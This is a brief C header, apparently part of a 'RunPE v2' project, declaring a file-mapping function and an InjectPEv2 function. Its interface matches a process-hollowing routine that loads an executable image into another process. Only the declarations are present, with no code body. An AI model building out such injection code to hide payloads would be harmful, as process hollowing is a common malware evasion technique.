#include "stdafx.h"
#include "sysutils.h"

#ifndef RUNPEV2_H
#define RUNPEV2_H

DWORD MapFileFromNameEx(HANDLE hProcess, LPCWSTR swFilePath, PMAPPEDFILE mFile);
DWORD InjectPEv2(LPPROCESS_INFORMATION pProcessInfo, PVOID Buffer, DWORD SizeOfBuffer);

#endif